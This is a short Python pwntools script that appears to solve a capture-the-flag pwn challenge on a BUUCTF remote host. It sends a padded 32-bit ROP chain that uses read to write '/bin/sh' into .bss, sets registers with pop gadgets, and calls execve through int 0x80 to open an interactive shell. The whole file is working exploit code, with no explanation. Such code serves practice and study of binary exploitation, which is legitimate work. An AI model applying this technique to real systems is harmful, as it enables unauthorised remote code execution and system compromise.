from pwn import *


# p = process("./rop")
p = remote("node4.buuoj.cn", 29365)


read = 0x0806D29A
pop_edx_ecx_ebx_ret = 0x0806ed00
pop_eax_ret = 0x080b8016
int_0x80 = 0x0806f430
bss_addr = 0x080EAF80


pad = cyclic(0xc+0x4)
pad += p32(read)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(bss_addr)+p32(8)
pad += p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bss_addr)
pad += p32(pop_eax_ret)+p32(0xb)
pad += p32(int_0x80)
p.sendline(pad)
p.send("/bin/sh\x00")

p.interactive()


